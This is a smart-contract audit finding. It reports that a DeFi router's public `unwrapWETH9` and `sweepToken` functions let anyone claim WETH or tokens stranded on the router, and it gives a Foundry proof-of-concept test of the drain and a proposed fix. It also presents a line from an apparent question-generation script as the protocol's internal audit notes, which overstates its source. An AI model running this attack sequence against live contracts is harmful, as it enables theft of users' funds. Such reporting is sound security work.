### Title
Unguarded `unwrapWETH9` Allows Any Caller to Steal Router-Held WETH as ETH — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`PeripheryPayments.unwrapWETH9` is a `public payable` function with no access control and an attacker-controlled `recipient` parameter. It unconditionally drains the router's entire WETH balance and forwards it as native ETH to any address the caller specifies. Because the documented ETH-output pattern requires a user to set `recipient = router` in a swap step, any WETH that lands on the router — whether from a standalone call or a failed/incomplete multicall — is immediately claimable by an arbitrary third party.

---

### Finding Description

`unwrapWETH9` reads the router's full WETH balance and transfers it to a caller-supplied address: [1](#0-0) 

There is no `msg.sender` check, no per-user accounting, and no restriction on `recipient`. The function is callable by anyone at any time.

The intended ETH-output pattern (documented in the test suite) is:

```
multicall([
  exactInputSingle(tokenOut=WETH, recipient=router),  // WETH lands on router
  unwrapWETH9(0, user)                                // user claims it
])
``` [2](#0-1) 

This pattern is atomic only when both calls are inside the same `multicall`. If a user calls `exactInputSingle(recipient=router)` as a standalone transaction — a natural mistake given the interface accepts any `recipient` — the WETH output is stranded on the router between blocks and is immediately stealable.

The same unguarded sweep applies to `sweepToken`, which can drain any ERC-20 stranded on the router to an arbitrary address. [3](#0-2) 

The protocol's own internal audit notes explicitly flag this risk: *"This helper is public and balance-based, so any earlier step that strands WETH on the router can turn into a direct theft path if attribution is weak."* [4](#0-3) 

---

### Impact Explanation

Direct theft of user principal. A victim who calls `exactInputSingle(tokenOut=WETH, recipient=router)` outside of a multicall loses their entire swap output. An attacker monitoring the mempool or chain state calls `unwrapWETH9(0, attacker)` in the next transaction and receives all router-held WETH as ETH. Loss is 100% of the victim's output with no recovery path.

---

### Likelihood Explanation

- `unwrapWETH9` is unconditionally public; no special role or condition is required to call it.
- The ETH-output pattern explicitly requires `recipient=router` as an intermediate step; users who omit the `multicall` wrapper (a common integration mistake) trigger the vulnerable state.
- A mempool watcher or block-level bot can detect the stranded balance and front-run or back-run the victim's transaction with a single call.
- `sweepToken` creates the identical risk for any ERC-20 output routed through the router.

---

### Recommendation

Restrict `unwrapWETH9` and `sweepToken` so that the ETH/token can only be sent to `msg.sender`, removing the attacker-controlled `recipient` parameter:

```solidity
function unwrapWETH9(uint256 amountMinimum) public payable {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);
    if (balanceWETH > 0) {
        IWETH9(WETH).withdraw(balanceWETH);
        _transferETH(msg.sender, balanceWETH);  // always to caller, never arbitrary
    }
}
```

This preserves the multicall pattern (the caller inside a multicall is the original `msg.sender` via `delegatecall`) while eliminating the theft vector.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Foundry test sketch (pseudocode, adapt to SimpleRouterTestBase)
function test_attacker_steals_victim_weth_via_unwrapWETH9() public {
    uint128 amountIn = 3_000;

    // tx1: victim swaps token -> WETH, mistakenly sets recipient=router (standalone, not multicall)
    vm.prank(victim);
    router.exactInputSingle(ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(token1),
        tokenOut: address(weth),
        zeroForOne: false,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: address(router),   // <-- WETH stranded here
        deadline: block.timestamp + 1,
        priceLimitX64: type(uint128).max,
        extensionData: ""
    }));

    uint256 routerWeth = weth.balanceOf(address(router));
    assertGt(routerWeth, 0, "WETH stranded on router");

    // tx2: attacker drains it
    uint256 attackerEthBefore = attacker.balance;
    vm.prank(attacker);
    router.unwrapWETH9(0, attacker);   // no access control, arbitrary recipient

    assertEq(weth.balanceOf(address(router)), 0, "router WETH drained");
    assertEq(attacker.balance - attackerEthBefore, routerWeth, "attacker received victim ETH");
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L37-45)
```text
  function unwrapWETH9(uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);

    if (balanceWETH > 0) {
      IWETH9(WETH).withdraw(balanceWETH);
      _transferETH(recipient, balanceWETH);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L48-55)
```text
  function sweepToken(address token, uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceToken = IERC20(token).balanceOf(address(this));
    if (balanceToken < amountMinimum) revert InsufficientToken(token, amountMinimum, balanceToken);

    if (balanceToken > 0) {
      IERC20(token).safeTransfer(recipient, balanceToken);
    }
  }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L8-10)
```text
/// @dev Native ETH flows follow Uniswap v3-periphery multicall patterns:
///      - ETH input: multicall{value}(exactInput*) with WETH as tokenIn
///      - ETH output: swap WETH to router, then unwrapWETH9 in the same multicall
```

**File:** generate_scanned_questions.py (L474-476)
```python
            values="router-held WETH, native ETH sent, and whether leftover balances from earlier public steps are isolated to the right user",
            control_hint="This helper is public and balance-based, so any earlier step that strands WETH on the router can turn into a direct theft path if attribution is weak.",
            validation_focus="Leave controlled WETH residue on the router across different public call sequences and assert only the rightful caller can unwrap or claim it.",
```
